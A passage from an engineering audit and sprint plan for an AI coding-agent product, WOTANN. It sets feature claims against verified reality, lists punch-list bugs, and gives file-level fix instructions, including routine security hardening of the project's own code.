| "86 skills" | **76 load** (10 missing frontmatter), injected as prompt guidance |
| "MCP marketplace" | **Registry imports from Claude Code work; marketplace is vaporware** |
| "Sidecar binaries" | **Placeholders** — 89-byte script + 0-byte empty file |
| "iOS companion" | **140 Swift files, 60 RPC methods, streaming works** — but SPM deps never resolved |
| "3,659 tests" | **Genuinely strong** — 77% strong assertions, real SQLite/HTTP/subprocess testing |
| "Autonomous mode" | **Module exists (2,000 LOC), not wired to RPC, CLI crashes with ECANCELED** |
| "Proof bundles" | **TrustView with 5 components exists** — generation works, attachment to completions inconsistent |
| "Cost tracking" | **Works** — real token counts at static prices, tray icon shows live data |
| "Context compaction" | **4/5 strategies work, auto-invoked** — genuinely functional |
| "Provider fallback" | **Works** — tested, context transfers, rate limiting enforced |
| "Voice" | **TTS works (macOS). STT requires external deps. 2 shell injection vulns.** |
| "Hooks (26 guards)" | **6 block, 6 fake guarantees, 3 hollow, 10+ advisory** |

---

## 61. Additional Items for Punch List (from Round 7)

| # | Issue | Severity | Fix | Effort |
|---|---|---|---|---|
| 43 | **`tools` dropped in agent-bridge.ts:78-86** — capability equalization dead | 🔴 CRITICAL | Add `tools: options.tools` | 1 line |
| 44 | **`parseToolCallFromText()` never called** — XML tool responses unparsed | 🔴 CRITICAL | Wire into response pipeline in agent-bridge.ts | 30 LOC |
| 45 | **Vision "emulation" is placeholder text** — model gets zero image info | 🟡 HIGH | Integrate Florence-2 or OCR pipeline | 4h |
| 46 | **Edge TTS never integrated** into voice cascade | 🟢 LOW | Add to TTS detection order | 30 min |
| 47 | **Shell injection in tts-engine.ts:455** (second location) | 🔴 CRITICAL | Same fix as voice-mode.ts:509 | 30 min |
| 48 | **Sidecar binaries are placeholders** | 🟡 MEDIUM | Download-on-first-run or remove from bundle | 2h |
| 49 | **iOS SPM deps never resolved** — 6 duplicate xcodeproj | 🟡 HIGH | `swift package resolve` + delete duplicate projects | 1h |
| 50 | **`mcp-marketplace.ts` fake registry URL** | 🟢 LOW | Delete or replace with GitHub-based search | 30 min |
| 51 | **SubagentLimit + LSP middleware layers are dead code** | 🟢 LOW | Delete or fix conditions | 30 min |
| 52 | **5 advisory middleware layers set flags nothing reads** | 🟡 MEDIUM | Either wire consumers or demote to telemetry | 2h |
| 53 | **`offload-to-disk` strategy offloads to memory, not disk** | 🟢 LOW | Rename or implement disk persistence | 1h |
| 54 | **macOS STT reports "system" available but can't transcribe** | 🟡 MEDIUM | Remove from detection or implement native dictation API | 2h |
| 55 | **`npm pack` ships source maps + empty skills/** | 🟢 LOW | Add `.npmignore` | 15 min |

---

## 62. Cross-Session Topic Keys (Round 7)

- `audits/wotann-r7-middleware-execution` — all 26 layers traced, real execution counts
- `audits/wotann-r7-capability-equalization` — tools dropped + parseToolCall dead + vision stub
- `audits/wotann-r7-test-quality` — 7,222 assertions, behavioral ratio, integration test coverage
- `audits/wotann-r7-channel-adapters` — 14/16 real with protocol-level evidence
- `audits/wotann-r7-voice-cost-context` — TTS/STT backends, cost tracking, compaction strategies
- `audits/wotann-r7-skills-mcp-sidecars` — skill execution path, dual MCP system, placeholder binaries, build verification

---

---

---

# ROUND 8 — FINAL VERIFICATION (Intelligence, Orchestration, Prompt Modules, iOS Platform)

> 3 final Opus-class agents. Total: **16 agents, 8 audit rounds, 1000+ files read.** These cover the last unverified subsystems: 42 intelligence modules individually, 29 orchestration files individually, 17 prompt modules individually, and all iOS platform features.

---

## 63. Intelligence Modules — 21/42 Meaningfully Affect Model Behavior

42 files exist (13,770 LOC total). The real functional count by category:

### Modify LLM Input (prompt/system prompt/tools) during query: 18
`amplifier` (task preambles), `accuracy-boost` (10 structured techniques), `overrides` (7 rules → system prompt), `auto-enhance` (vague prompt rewriting), `forgecode-techniques` (tool-call correction, doom-loop — only ~200/1075 lines fire), `prefill-continuation` (truncation re-query), `auto-reviewer` (code review injection), `schema-optimizer` (tool schema reordering), `provider-arbitrage` (cheapest provider selection), `adaptive-prompts` (model-specific scaffolding), `user-model` (user profile injection), `cross-device-context` (multi-device awareness), `wall-clock-budget` (time pressure), `auto-mode-detector` (mode switching), `domain-skill-router` (domain context), `codemaps` (AST symbol injection), `task-semantic-router` (model selection), `bash-classifier` (dangerous command blocking)

### Inject Post-Response Warnings/Gates: 5
`response-validator`, `bugbot` (diff scanning), `trajectory-scorer` (meandering detection), `error-pattern-learner`, `smart-retry`

### Pure Tracking/Metadata (no LLM impact): 7
`trace-analyzer`, `flow-tracker`, `away-summary`, `micro-eval`, `context-relevance`, `ai-time-machine`, `predictive-context`

### Instantiated But Dead in Query Path (getter-only): 6
`verification-cascade` (only in preCommitAnalysis), `benchmark-harness`, `video-processor`, `rd-agent` (confirmed never invoked), `auto-verify`, `parallel-search`

### Pure Orphan (not imported by runtime): 3
`non-interactive`, `auto-mode` (superseded by auto-mode-detector), `smart-file-search`

### Functionally Inert (imported but does nothing): 2
- **`deep-research.ts`** (616 lines) — `defaultSearch()` returns `[]`. No search/fetch callbacks injected. Runs decomposition but produces 0 citations. **616 lines of dead code.**
- **`ambient-awareness.ts`** (430 lines) — exposed as `runtime.getAmbientContext()` getter. Never called during query(). Daemon uses separate `AmbientAwareness` class.

### Key Individual Findings

| Module | Lines | Finding |
|--------|-------|---------|
| `accuracy-boost.ts` | 832 | **WORKS** — prepends 10 accuracy techniques to every prompt. Real output modification. |
| `forgecode-techniques.ts` | 1,075 | **PARTIAL** — only 2/7 techniques fire during queries (~200 LOC active). 5 techniques exported but not called. |
| `deep-research.ts` | 616 | **INERT** — search backend returns empty array. 0 citations produced. |
| `auto-reviewer.ts` | 620 | **WORKS** — reviews Write/Edit tool calls against configurable rules, injects feedback. |
| `rd-agent.ts` | 170 | **CONFIRMED DEAD** — instantiated, getter-only, never invoked. |
| `verification-cascade.ts` | 317 | **NOT in query path** — only runs in `runPreCommitAnalysis()`, fire-and-forget. |
| `auto-commit.ts` | N/A | (In orchestration) `simulateCommit()` generates random hash — does NOT run git. |
| `ambient-awareness.ts` | 430 | **GETTER-ONLY** — never called during query despite being imported by runtime. |
| `video-processor.ts` | 373 | **GETTER-ONLY** — never invoked during any query. |

**Corrected claim**: "21 intelligence modules that meaningfully affect model behavior" — not "42 intelligence modules."

---

## 64. Orchestration Patterns — 10/29 Are Genuine Multi-Step Patterns

29 files (9,405 LOC total). Real breakdown:

### Genuine Multi-Step Orchestration (different from runtime.query()): 10
| Pattern | Lines | What Makes It Different |
|---------|-------|----------------------|
| `autonomous.ts` | 1,258 | Multi-cycle with heartbeat, doom-loop, strategy escalation, shadow-git |
| `coordinator.ts` | 273 | Git worktree per phase, parallel fan-out via graph-dsl |
| `wave-executor.ts` | 247 | Dependency-aware waves, context isolation per task, token budgeting |
| `council.ts` | 378 | 3-stage: parallel responses → anonymized peer review → chairman synthesis |
| `arena.ts` | 167 | Blind multi-model comparison with shuffled identities |
| `ralph-mode.ts` | 198 | Verify/fix loop with DoomLoopDetector, budget/time limits |
| `self-healing-pipeline.ts` | 479 | 12-pattern error classification, graduated recovery (prompt→rollback→strategy→human) |
| `workflow-dag.ts` | 488 | YAML workflow engine with sequential/parallel/loop/approval nodes |
| `architect-editor.ts` | 175 | Architect (plan) → Editor (implement) split with separate model tiers |
| `ultraplan.ts` | 251 | Extended-thinking planning prompt builder |

### Infrastructure/Support (enables the above): 7
`graph-dsl`, `plan-store` (SQLite-backed), `agent-registry` (14 agent defs), `agent-hierarchy` (depth limiter), `agent-workspace` (FS messaging), `autonomous-context` (budget mgmt), `task-delegation`

### Serializer/Utility: 2
`proof-bundles` (JSON writer, not a "pattern"), `pwr-cycle` (keyword state machine, no LLM calls)

### Lib.ts Re-Export Only (half-built, never instantiated): 8
`spec-to-ship`, `agent-messaging`, `ambient-code-radio`, `red-blue-testing`, `consensus-router`, `auto-commit` (simulateCommit generates random hash — does NOT run git), `agent-protocol`, `agent-graph-gen` (trivial keyword decomposition, not LLM-powered)

### Dead: 1
`issue-to-pr` — zero importers confirmed

**Corrected claim**: "10 genuine multi-step orchestration patterns + 7 infrastructure modules" — not "29 orchestration patterns."

---

## 65. Prompt Engine Modules — 17/17 Functional, Minor Bugs

All 17 modules produce output and are wired. No bugs as severe as the SOUL.md regex. Issues found:

| Module | Severity | Issue |
|--------|----------|-------|
| `tools.ts` | MEDIUM | TOOL_CATALOG is hardcoded 14-entry array, not derived from runtime. Missing NotebookEdit, EnterWorktree, ExitWorktree. HashlineEdit listed but may not exist. |
| `capabilities.ts` | MEDIUM | Missing provider profiles for copilot, xai, mistral. Possible `"google"` vs `"gemini"` name mismatch. |
| `conventions.ts` | LOW | Brittle regex assumes exact `"## Architecture Rules"` header in CLAUDE.md |
| `identity.ts` | LOW | Hardcoded default `65` for skill count when `skillNames` not populated |
| `phone.ts` | LOW | Default capabilities hardcoded, may drift from actual iOS app |
| `cost.ts` | LOW | Cost-awareness hint always injected even without a budget set |
| `memory.ts` | LOW | Type widening via `as` cast for extended context properties |

Token budget: ~1,540 tokens total. Not hard-enforced at assembly level — modules are self-limiting by size (20-142 lines each). No conflicts or overlaps between modules detected.

---

## 66. iOS Platform Features — ALL 8 REAL (strongest platform implementation)

| Feature | Lines | Status | Key Evidence |
|---------|-------|--------|-------------|
| **Apple Watch** | 595 | **REAL** | Full WCSession both sides, 7 quick actions, 5 SwiftUI views, iPhone handlers for Watch messages |
| **CarPlay** | 348 | **REAL** | CPTabBarTemplate with 3 tabs (Chat/Voice/Status), voice input, live conversation subscription |
| **Widgets** | ~200 | **REAL** | 2 widgets (CostWidget, AgentStatusWidget) reading shared UserDefaults, auto-refresh |
| **Siri/AppIntents** | ~300 | **REAL** | 3 intents (AskWOTANN, CheckCost, EnhancePrompt) with RPC via Keychain-stored credentials |
| **Share Extension** | ~150 | **REAL** | Full pipeline: extract → queue in shared defaults → main app pickup on launch |
| **HealthKit** | ~200 | **REAL** | Auth + 3 data types (steps/sleep/energy) + 5 insight generators |
| **NFC** | ~150 | **REAL** | Read AND write NFC tags, NDEF URI parsing, haptic feedback |
| **Live Activities** | ~100 | **REAL** | ActivityKit widget with Dynamic Island, but Activity.request() call site not located |

### Additional iOS Findings
- **token-stats.json**: 970 sessions with 0 tokens — **token tracking broken or reset**
- **DREAMS.md**: 5 dream diary entries, all showing 0 entries processed — pipeline runs but produces nothing
- **instincts.json**: 1 entry with low confidence — learning system has not accumulated data
- **6 duplicate .xcodeproj files** — need cleanup
- **SPM dependencies NEVER RESOLVED** — no Package.resolved file exists

---

## 67. install.sh — Functional with Gaps

| Aspect | Status |
|--------|--------|
| OS detection (macOS/Linux) | **WORKS** |
| Node.js ≥ 20 check + auto-install via nvm | **WORKS** |
| npm install fallback to local build | **WORKS** |
| Provider detection (Anthropic/OpenAI/Copilot/Ollama) | **WORKS** |
| PATH verification | **WORKS** |
| **Ollama installation** | **MISSING** — only detects, doesn't install |
| **Linux PATH handling** | **INCOMPLETE** — nvm-installed Node may not be on PATH in curl pipe |
| **`npm bin -g` deprecated** | **MINOR** — deprecated in npm 9+, fallback exists |
| **Uninstall path** | **MISSING** — no `--uninstall` flag |

---

## 68. Bootstrap Files (.wotann/) — Accuracy Assessment

| File | Status | Issue |
|------|--------|-------|
| AGENTS.md | **ACCURATE** | Aspirational but matches designed capabilities |
| AGENT-ROSTER.md | **ACCURATE** | 14 agents in 4 tiers |
| TOOLS.md | **MOSTLY ACCURATE** | Enhanced tools (HashlineEdit, SymbolEdit, SmartRename) may be aspirational; `qmd` MCP stale |
| MEMORY.md | **ACCURATE** | 8-layer system matches running DB (561KB + 1.1MB WAL) |
| SOUL.md | **ACCURATE** | Clean Norse identity (regex bug is in identity.ts, not SOUL.md itself) |
| IDENTITY.md | **ACCURATE** | Minimal but correct |
| USER.md | **EMPTY** | Placeholder — instincts/dreams not accumulating |
| HEARTBEAT.md | **ACCURATE** | Matches daemon.status.json (12 tasks, 10,575 ticks) |
| BOOTSTRAP.md | **ACCURATE** | Runtime template with correct placeholders |
| DESIGN.md | **ACCURATE** | Detailed Obsidian Precision design system |
| DREAMS.md | **STALE** | 5 empty dream entries |
| gotchas.md | **EMPTY** | Just header, no content |
| token-stats.json | **BROKEN** | 970 sessions, 0 tokens |

---

## 69. DEFINITIVE Product Truth Table (Final — supersedes §60)

| Claim | Verified Reality |
|-------|-----------------|
| **"42 intelligence modules"** | **21 meaningfully affect model behavior.** 7 metadata-only, 6 getter-only/dead, 3 orphaned, 2 inert, 3 partial. |
| **"29 orchestration patterns"** | **10 genuine multi-step patterns.** 7 infrastructure, 2 utility, 8 lib-export-only, 1 dead, 1 fake (auto-commit simulates). |
| **"26-layer middleware"** | **2 transform LLM data on typical query.** 16 conditional, 5 advisory (flags nothing reads), 2 dead code. |
| **"17 providers"** | **17 enum values ✅** but tools dead in 4/5 adapters. |
| **"Capability equalization"** | **Thinking works. Tools disconnected (1-line fix). Vision = placeholder text. parseToolCallFromText = dead code.** |
| **"8-layer memory"** | **5.5 real.** Vector = TF-IDF. Graph-RAG works with temporal queries. |
| **"15 channels"** | **14 real, 2 partial.** Strongest subsystem. Zero stubs. |
| **"20+ themes"** | **0 themes.** Directory empty. |
| **"TurboQuant"** | **Ollama KV cache flags rebranded.** |
| **"86 skills"** | **76 load.** Injected as system prompt guidance (max 4, 2400 chars each). |
| **"MCP marketplace"** | **MCPMarketplace = vaporware. MCPRegistry = works (imports from Claude Code).** |
| **"Sidecar binaries"** | **89-byte script + 0-byte empty file. Placeholders.** |
| **"iOS companion"** | **ALL 8 platform features REAL (Watch/CarPlay/Widgets/Siri/Share/HealthKit/NFC/Live Activities).** SPM deps never resolved. |
| **"3,659 tests"** | **Genuinely strong.** 77% strong assertions. Real SQLite/HTTP/subprocess/sandbox testing. |
| **"Autonomous mode"** | **2,000 LOC module exists, not wired to RPC. CLI crashes with ECANCELED.** |
| **"Proof bundles"** | **TrustView works. proof-bundles.ts is just a JSON serializer, not proof generation.** |
| **"Cost tracking"** | **Works.** Real token counts at static prices. Tray shows live data. |
| **"Context compaction"** | **4/5 strategies work, auto-invoked.** Genuinely functional. |
| **"Provider fallback"** | **Works.** Tested, context transfers, rate limiting enforced. |
| **"Voice"** | **TTS works (macOS). STT needs external deps. 2 shell injection vulns.** |
| **"Hooks"** | **6 block, 6 fake guarantees, 3 hollow, 10+ advisory.** |
| **"Deep research"** | **616 lines of dead code.** `defaultSearch()` returns `[]`. 0 citations produced. |
| **"Token tracking"** | **Broken.** 970 sessions, 0 tokens recorded. |
| **"Dream pipeline"** | **Runs but produces nothing.** 5 diary entries with 0 processed. |
| **"install.sh"** | **Functional.** Missing Ollama install, Linux PATH gap. |

---

## 70. Final Additions to Punch List (from Round 8)

| # | Issue | Severity | Fix | Effort |
|---|---|---|---|---|
| 56 | **`deep-research.ts` defaultSearch returns []** — 616 lines inert | 🟡 HIGH | Inject WebSearch/WebFetch callbacks from runtime | 2h |
| 57 | **`forgecode-techniques.ts` only 200/1075 lines fire** — 5 techniques exported but uncalled | 🟢 LOW | Wire remaining techniques or delete dead exports | 2h |
| 58 | **8 orchestration modules in lib.ts only** — never instantiated | 🟢 LOW | Either wire to runtime or delete from lib.ts | 1h |
| 59 | **`auto-commit.ts` simulateCommit generates random hash** — does NOT run git | 🟡 MEDIUM | Implement real git commit or delete | 1h |
| 60 | **`tools.ts` TOOL_CATALOG hardcoded** — missing 3+ real tools, listing aspirational ones | 🟡 MEDIUM | Derive from runtime tool registration | 1h |
| 61 | **`capabilities.ts` missing 3 provider profiles** (copilot, xai, mistral) | 🟡 MEDIUM | Add provider profiles | 30 min |
| 62 | **token-stats.json shows 0 tokens across 970 sessions** — tracking broken | 🟡 HIGH | Debug token recording pipeline | 2h |
| 63 | **iOS 6 duplicate .xcodeproj files** — clutter | 🟢 LOW | Delete duplicates (keep WOTANN.xcodeproj only) | 5 min |
| 64 | **install.sh doesn't install Ollama** | 🟡 MEDIUM | Add Ollama install or explicit message | 30 min |
| 65 | **Live Activities Activity.request() call site not found** | 🟡 MEDIUM | Wire Activity lifecycle in TaskMonitorViewModel | 2h |
| 66 | **6 intelligence modules are getter-only** (verification-cascade, benchmark, video, rd-agent, auto-verify, parallel-search) | 🟢 LOW | Wire into query path or demote to standalone API | 3h |

---

## 71. Cross-Session Topic Keys (Round 8 — Final)

- `audits/wotann-r8-intelligence-modules` — all 42 files individually classified
- `audits/wotann-r8-orchestration-patterns` — all 29 files individually verified with multi-step evidence
- `audits/wotann-r8-prompt-modules` — all 17 modules bug-checked
- `audits/wotann-r8-ios-platform` — Watch/CarPlay/Widgets/Siri/Share/HealthKit/NFC/LiveActivities verified
- `audits/wotann-r8-bootstrap-files` — .wotann/ accuracy assessment
- `audits/wotann-r8-install-script` — install.sh functional review

---

---

---

# §72. AUTONOMOUS EXECUTION PLAN — START HERE

> **This section supersedes §4, §22, §33, §44, §45, §61, §70.** It is the single consolidated, dependency-ordered, verification-annotated task list. Claude Code: start here, execute sequentially within each sprint, mark items done as you go. Items within the same sprint that have no `depends:` can be parallelized.

> **Reference sections** (read for context, don't execute): §1-§3 (state of product), §8-§21 (strategy/competitors/roadmap), §36-§43 (reconciliation), §48-§69 (subsystem verification). **Action sections** (this is what to build): §72 only.

---

## SPRINT 0 — IMMEDIATE (all independent, <1 hour total)

> Security fixes + trivial corrections. Zero dependencies between items. Parallelize freely.

| ID | Task | File:line | Exact Change | Effort | Verify |
|---|---|---|---|---|---|
| S0-1 | **Delete leaked Supabase creds** | `CREDENTIALS_NEEDED.md` | `git rm CREDENTIALS_NEEDED.md && git commit -m "security: remove leaked Supabase credentials"` — then rotate the Supabase anon key at supabase.com dashboard | 5 min | `test ! -f CREDENTIALS_NEEDED.md` |
| S0-2 | **Fix SOUL.md regex** | `src/prompt/modules/identity.ts:37` | Change `soul.match(/## Core Values\n/)` to `soul.match(/## (?:Core Values|What You Value)\n([\s\S]*?)(?=\n## |$)/)` | 30 sec | `npm run typecheck` |
| S0-3 | **Fix thin-client socket path** | `src/cli/thin-client.ts:22` | Change `"daemon.sock"` to `"kairos.sock"` | 30 sec | `grep -q "kairos.sock" src/cli/thin-client.ts` |
| S0-4 | **Fix npm audit vulnerabilities** | `package.json` | `npm audit fix` | 2 min | `npm audit --audit-level=high` exits 0 |
| S0-5 | **Rename turboquant.ts** | `src/context/turboquant.ts` | Rename file to `src/context/ollama-kv-compression.ts`, update all imports (runtime.ts, lib.ts) | 10 min | `npm run typecheck` |
| S0-6 | **Move claude-agent-sdk to peerDeps** | `package.json:61` | Move `"@anthropic-ai/claude-agent-sdk"` from `dependencies` to `peerDependencies` | 5 min | `npm run typecheck` |
| S0-7 | **Gate AUTH_BYPASS to test mode** | `src/daemon/kairos-ipc.ts:125` | Change `process.env["WOTANN_AUTH_BYPASS"] === "1"` to `process.env["WOTANN_AUTH_BYPASS"] === "1" && process.env["NODE_ENV"] === "test"` | 30 sec | `npm run typecheck` |
| S0-8 | **Fix webhook timing-safe compare** | `src/channels/webhook.ts:104` | Replace `authHeader !== \`Bearer ${secret}\`` with `!timingSafeEqual(Buffer.from(authHeader), Buffer.from(\`Bearer ${secret}\`))` after length check | 5 min | `npm run typecheck` |
| S0-9 | **Add YAML frontmatter to 10 skills** | `skills/{a2ui,canvas-mode,batch-processing,computer-use,cost-intelligence,lsp-operations,mcp-marketplace,benchmark-engineering,prompt-testing,self-healing}.md` | Add `---\nname: <name>\ndescription: <desc>\n---` to each | 30 min | `node -e "require('./dist/skills/loader').SkillRegistry" && echo "check count"` or `npm test -- skills` |
| S0-10 | **Migrate ESLint 9** | `.eslintrc.json` → `eslint.config.js` | Create flat config with `@typescript-eslint/eslint-plugin`, delete `.eslintrc.json` | 30 min | `npx eslint src/ --max-warnings=0 || true` (should produce real output, not silent) |

**Sprint 0 total: ~1.5 hours. Commit after each item.**

---

## SPRINT 1 — TRANSPORT + CORE WIRING (Week 1, highest leverage)

> These are the items that unlock the most existing code. Order matters within groups.

### Group A: Tool Serialization (THE critical bug — unlocks entire harness thesis)

| ID | Task | File:line | Exact Change | Effort | Depends | Verify |
|---|---|---|---|---|---|---|
| S1-1 | **Forward `tools` in agent-bridge.ts** | `src/core/agent-bridge.ts:78-86` | Add `tools: options.tools,` to the `UnifiedQueryOptions` object | 1 line | — | `npm run typecheck` |
| S1-2 | **Wire parseToolCallFromText into response pipeline** | `src/core/agent-bridge.ts` (after adapter returns text) | After streaming text from non-tool-native adapters, call `parseToolCallFromText(text)` from capability-augmenter.ts. If it returns a tool call, yield a tool_use chunk instead of text. ~30 LOC. | 1h | S1-1 | `npm test -- capability-augmenter` |
| S1-3 | **Add tools to Anthropic adapter** | `src/providers/anthropic-adapter.ts:126-132` | Add `tools: options.tools?.map(t => ({ name: t.name, description: t.description, input_schema: t.parameters }))` to the `client.messages.stream()` call | 1h | — | `npm run typecheck` |
| S1-4 | **Add tools to OpenAI-compat adapter** | `src/providers/openai-compat-adapter.ts:88-94` | Add `tools: options.tools?.map(t => ({ type: "function", function: { name: t.name, description: t.description, parameters: t.parameters } }))` to body | 1h | — | `npm run typecheck` |
| S1-5 | **Add tools to Copilot adapter** | `src/providers/copilot-adapter.ts:251-257` | Same OpenAI-format tools injection | 1h | — | `npm run typecheck` |
| S1-6 | **Add tools to Codex adapter** | `src/providers/codex-adapter.ts:214-221` | Add tools in Codex's format (check Codex API docs for tool schema) | 1h | — | `npm run typecheck` |

### Group B: Desktop Transport (unlocks ~1,700 LOC frontend)

| ID | Task | File:line | Exact Change | Effort | Depends | Verify |
|---|---|---|---|---|---|---|
| S1-7 | **Replace send_message Tauri stub** | `desktop-app/src-tauri/src/commands.rs:342` | Replace body with real UDS client that forwards JSON-RPC payload to `~/.wotann/kairos.sock` and returns daemon response. Use `ipc_client.rs` as reference for UDS connection. ~50 LOC Rust. | 3h | — | Build desktop: `cd desktop-app && npm run tauri:dev`, test @ references trigger in chat |
| S1-8 | **Verify @ references work** | `desktop-app/src/components/chat/AtReferences.tsx` | After S1-7, type `@file:` in chat and verify file suggestions appear | — | S1-7 | Manual: type `@file:` in desktop chat |
| S1-9 | **Verify ghost-text works** | `desktop-app/src/components/editor/InlineCompletion.ts` | After S1-7, open Editor tab and verify inline completions appear | — | S1-7 | Manual: open Editor, start typing |
| S1-10 | **Fix workflow.save handler** | `src/daemon/kairos-rpc.ts` | Add `workflow.save` handler that persists workflow definition to `~/.wotann/workflows/<name>.yaml` | 1h | — | `npm test -- workflow` or manual: save workflow in desktop |
| S1-11 | **Fix workflow.start to use user nodes** | `src/daemon/kairos-rpc.ts:3247` | Change handler to parse `params.nodes` array and build execution graph from user definition, not just `engine.getBuiltin(name)` | 2h | S1-10 | Manual: create workflow in desktop, run it |

### Group C: Autonomous Mode (unlocks 2,000 LOC)

| ID | Task | File:line | Exact Change | Effort | Depends | Verify |
|---|---|---|---|---|---|---|
| S1-12 | **Wire autonomous.run RPC to executor** | `src/daemon/kairos-rpc.ts:2708-2732` | Replace handler body: `const executor = this.runtime.getAutonomousExecutor(); const result = await executor.execute(task, async (p) => { let o=""; for await (const c of this.runtime.query({prompt:p})){if(c.type==="text") o+=c.content??"";} return {output:o,costUsd:0,tokensUsed:0}; }, this.runtime.getVerificationCascade()); return {task, result, timestamp: Date.now()};` | 1h | — | `npm run typecheck`, then `node dist/index.js autonomous "echo hello" --provider ollama` |

### Group D: ECDH Standardization (fixes iOS encryption)

| ID | Task | File:line | Exact Change | Effort | Depends | Verify |
|---|---|---|---|---|---|---|
| S1-13 | **Standardize ECDH on P-256 + raw + HKDF** | `src/mobile/secure-auth.ts`, `src/daemon/kairos-rpc.ts:4118`, `src/desktop/companion-server.ts:1205` | All three: use `createECDH("prime256v1")`, output raw 64-byte keys (strip 0x04 prefix), derive AES key via HKDF-SHA256 with salt "wotann-v1". Match iOS CryptoKit conventions. | 3h | — | `npm test -- secure-auth` |

### Group E: Memory/Daemon Health

| ID | Task | File:line | Exact Change | Effort | Depends | Verify |
|---|---|---|---|---|---|---|
| S1-14 | **Add memory retention policy** | `src/telemetry/audit-trail.ts`, `src/memory/store.ts` | Add `DELETE FROM audit_trail WHERE timestamp < datetime('now', '-30 days')` cron in audit-trail.ts. Add `DELETE FROM auto_capture WHERE timestamp < datetime('now', '-30 days')` in store.ts. Cap trace-analyzer entries at 10,000 with FIFO. Cap arena results at 500. | 3h | — | `npm run typecheck` |
| S1-15 | **Add .off() cleanup for event listeners** | All 23 files with `.on()` | In each file's `close()`/`destroy()`/`stop()` method, add corresponding `.off()` or `.removeAllListeners()` calls. Priority files: `kairos-ipc.ts` (7 listeners), `kairos-rpc.ts` (8), `supabase-relay.ts` (4). | 4h | — | `grep -r "\.off\(" src/ \| wc -l` should be > 0 |

**Sprint 1 total: ~25 hours. Commit after each group.**

---

## SPRINT 2 — WIRING + SECURITY + POLISH (Week 2)

| ID | Task | File:line | Effort | Depends | Verify |
|---|---|---|---|---|---|
| S2-1 | **Wire MultiFileComposer** | Import in EditorPanel or WorkshopView + create `composer_plan` Tauri command (underscore, not dot) + add `composer.plan` RPC handler in kairos-rpc.ts | 3h | S1-7 | Manual: open Composer in Editor |
| S2-2 | **Wire Plan mode to desktop UI** | Add Plan mode button/shortcut (Cmd+2) that routes to ultraplan.ts via daemon RPC | 2h | S1-7 | Manual: press Cmd+2 in desktop |
| S2-3 | **Fix shell injection voice-mode.ts** | `src/voice/voice-mode.ts:509` — replace `execFileSync("sh", ["-c", ...])` with `execFileSync("piper", ["--output_file", tempWav], {input: text})` using stdin pipe | 1h | — | `npm run typecheck` |
| S2-4 | **Fix shell injection tts-engine.ts** | `src/voice/tts-engine.ts:455` — same stdin pipe fix | 30 min | — | `npm run typecheck` |
| S2-5 | **Fix composer.apply path validation** | `src/daemon/kairos-rpc.ts:3040` — add `if (!path.resolve(edit.path).startsWith(path.resolve(workingDir))) throw "path outside workspace"` | 1h | — | `npm test` |
| S2-6 | **Fix session.resume path traversal** | `src/daemon/kairos-rpc.ts:2742` — validate sessionId contains only `[a-zA-Z0-9_-]` | 30 min | — | `npm test` |
| S2-7 | **Reconcile README** | `README.md` — use §69 truth table: "21 intelligence modules", "10 orchestration patterns", "20 middleware layers", "Obsidian Precision theme" (not 20+), fix CLI command names (autonomous not autopilot, arena not compare), remove debug share/profile | 1h | — | Read README, verify all claims match §69 |
| S2-8 | **Lower learning stack activation gates** | `src/learning/autodream.ts` — change 30min idle threshold to 10min OR trigger on session end regardless | 1h | — | `npm run typecheck` |
| S2-9 | **Delete dead code (~4,500+ LOC)** | Delete: `channels/supabase-relay.ts`, `channels/knowledge-connectors.ts`, `autopilot/never-stop.ts`, `browser/chrome-bridge.ts`, `intelligence/non-interactive.ts`, `intelligence/auto-mode.ts`, `orchestration/issue-to-pr.ts`. Remove from lib.ts imports. Delete iOS MainTabView + DashboardView + old AgentListView. Delete `src/ui/themes/` empty dir. | 2h | — | `npm run typecheck && npm test` |
| S2-10 | **Wire deep-research search callbacks** | `src/intelligence/deep-research.ts` — inject WebSearch/WebFetch callbacks from runtime when constructing DeepResearch instance | 2h | — | `npm run typecheck` |
| S2-11 | **Fix token-stats.json tracking** | Debug why 970 sessions recorded 0 tokens — likely the recording call in the query pipeline is not wired | 2h | — | Run a query, check `~/.wotann/token-stats.json` has non-zero values |
| S2-12 | **Delete 6 duplicate iOS xcodeproj** | `ios/WOTANN [2-6].xcodeproj` — delete all except `ios/WOTANN.xcodeproj` | 5 min | — | `ls ios/*.xcodeproj` shows only 1 |
| S2-13 | **Fix .wotann/.wotann/ nesting** | `src/core/config.ts` — add guard to prevent creating `.wotann/` inside an existing `.wotann/` directory | 30 min | — | `test ! -d .wotann/.wotann` |
| S2-14 | **Upgrade 6 fake-guarantee hooks to block** | `src/hooks/built-in.ts` — change DestructiveGuard, CompletionVerifier, TDDEnforcement, ReadBeforeEdit, ResultInjectionScanner from `action: "warn"` to `action: "block"`. Keep ConfigProtection as warn. | 2h | — | `npm test -- hooks` |
| S2-15 | **Implement 3 hollow hooks** | `src/hooks/built-in.ts` — PreCompactWALFlush: actually write to memory store. SessionSummary: call runtime.summarizeSession(). MemoryRecovery: call runtime.loadMemory(). | 2h | — | `npm test -- hooks` |
| S2-16 | **Fix tools.ts TOOL_CATALOG** | `src/prompt/modules/tools.ts` — derive catalog from runtime tool registration instead of hardcoded array | 1h | — | `npm run typecheck` |
| S2-17 | **Add missing provider profiles** | `src/prompt/modules/capabilities.ts` — add profiles for copilot, xai, mistral. Fix `"google"` vs `"gemini"` name | 30 min | — | `npm run typecheck` |

**Sprint 2 total: ~25 hours.**

---

## SPRINT 3 — COMPETITIVE PARITY + NATIVE GEMINI (Week 3)

| ID | Task | Effort | Depends | Verify |
|---|---|---|---|---|
| S3-1 | **Build native Gemini adapter** — `src/providers/gemini-native-adapter.ts` hitting `generativelanguage.googleapis.com/v1beta/models/{model}:streamGenerateContent`. Expose google_search, code_execution, url_context as capabilities. | 6h | S1-1 through S1-6 | `GEMINI_API_KEY=... node dist/index.js run "search for WOTANN" --provider gemini` |
| S3-2 | **Port hermes 11 open-model tool parsers** — create `src/providers/tool-parsers/{hermes,mistral,llama,qwen,deepseek,...}.ts`. Register via parser registry. | 12h | S1-2 | `npm test -- tool-parsers` |
| S3-3 | **Port hermes shadow-git auto-checkpointing** — snapshot before every write_file/patch | 4h | — | `npm test -- shadow-git` |
| S3-4 | **Real TurboQuant vector store** — `npm install turboquant-wasm onnxruntime-web`, create `src/memory/quantized-vector-store.ts`, replace TF-IDF internals keeping public API | 6h | S0-5 | `npm test -- vector-store` |
| S3-5 | **Port OpenClaw active-memory blocking sub-agent** — runs BEFORE main reply, edits memory | 4h | — | `npm test -- active-memory` |
